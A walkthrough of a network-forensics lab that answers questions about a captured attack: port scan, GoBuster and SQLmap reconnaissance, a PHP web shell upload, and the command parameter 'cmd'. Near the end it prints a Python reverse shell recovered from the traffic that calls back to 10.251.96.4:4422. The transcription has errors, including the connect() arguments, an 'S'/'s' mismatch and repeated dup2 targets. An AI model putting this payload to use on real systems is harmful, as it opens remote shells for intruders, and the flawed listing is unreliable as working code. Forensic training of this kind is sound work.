---
custom_edit_url: null
pagination_next: null
pagination_prev: null
---

## What is the IP responsible for conducting the port scan activity?
Port scanning is done for TCP ports.
In order to see the port scan activity, we have to to go `Statistics > Conversations > TCP`.

![1](https://github.com/Knign/Write-ups/assets/110326359/b2b6e66d-cff1-4e92-bd5b-e6cecd25319d)

### Answer
```
10.251.96.4
```

&nbsp;

## What is the port range scanned by the suspicious host?
Let's sort `Port B` in an ascending order.

![2](https://github.com/Knign/Write-ups/assets/110326359/46478686-7f2b-431d-954d-583265b08bfb)

We can see that the last port scanned is 1024.
### Answer
```
1-1024
```

&nbsp;

## What is the type of port scan conducted?
We can filter the packets using the following filter:
```
ip.src == 10.251.96.4
```

![3](https://github.com/Knign/Write-ups/assets/110326359/77cde470-7352-4a42-b6bd-4fd59c6353a5)

The packets that we filtered are TCP packets with the SYN flag set.
### Answer
```
TCP SYN
```

&nbsp;

## Two more tools were used to perform reconnaissance against open ports, what were they?
The application/tool and its version can be identified using the `User-Agent` header.

Using the following filter we can filter out packets sent to the suspicious agent and the User-Agent header.
```
ip.dst == 10.251.96.5 && http.user_agent
```

![4](https://github.com/Knign/Write-ups/assets/110326359/bb134ae8-a7ae-4ef3-be43-4309552cdf5b)

As we can see the first tool is GoBuster which is enumerating all the directories.

In order to find the second tool, we have to scroll down until we find an encoded URI.

![5](https://github.com/Knign/Write-ups/assets/110326359/0c14f5fc-fa7f-49d4-97a0-53698f5f2e05)

The second tool is SQLmap.
### Answer
```
gobuster 3.0.1, sqlmap 1.4.7
```

&nbsp;

## What is the name of the php file through which the attacker uploaded a web shell?
The HTTP POST method is used to upload data to a server. We can filter for these packets using the following filter:
```
http.request.method == POST
```
Scrolling down, we can see a POST request made for a `upload.php` file.

![6](https://github.com/Knign/Write-ups/assets/110326359/84ad7616-2e61-4fc3-a0a6-7c82ebb75bdb)

The `Referer` header in the packet tells us the address from which a resource has been requested.
### Answer
```
editprofile.php
```

&nbsp;

## What is the name of the web shell that the attacker uploaded?
Let's follow the TCP stream for the same packet by going to `Follow > TCP Stream`.

![7](https://github.com/Knign/Write-ups/assets/110326359/a8682218-3dfe-4c5f-bd32-4e3c6149b2f7)

As we can see the `Content-Disposition` header is set to `form-data` with the `dbfunctions.php` as the filename.
### Answer
```
dbfunctions.php
```

&nbsp;

## What is the parameter used in the web shell for executing commands?
In the same TCP Stream we can see an if statement that takes `cmd` as the parameter. 

![7](https://github.com/Knign/Write-ups/assets/110326359/4cf973ca-bafa-477a-ac40-6da3eb105bbd)

### Answer
```
cmd
```

&nbsp;

## What is the first command executed by the attacker?
The commands to the uploaded file are sent using GET requests. We can use the following filter to separate out these packets.
```
http.request.method == GET
```

![8](https://github.com/Knign/Write-ups/assets/110326359/b15615e2-303a-4024-b751-af31201f3314)

There were three commands executed: `id`, `python code` and `whoami`.
### Answer
```
id
```

&nbsp;

## What is the type of shell connection the attacker obtains through command execution?
We need to open the packet with the python script.

![9](https://github.com/Knign/Write-ups/assets/110326359/653d5d08-6458-477f-94c7-6028d5538d95)

Once formatted, the script looks as follows:
```python
import socket, subprocess, os;
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
s.connect("10.251.96.4", 4422);
os.dup2(S.fileno(),0)
os.dup2(S.fileno(),0)
os.dup2(S.fileno(),0)
p = subprocess.call(["/bin/sh", "-i"])
```
It creates a socket object `s` and connects to the specified IP address ("10.251.96.4") and port (4422).

It then uses `subprocess.call` to execute the `/bin/sh` shell with the "-i" flag, which opens an interactive shell session, effectively allowing the user to control the remote server.

This is inline with the characteristics of a reverse shell.
### Answer
```
Reverse shell
```

&nbsp;

## What is the port he uses for the shell connection?
We saw that the reverse shell connects to port 4422.
### Answer
```
4422
```
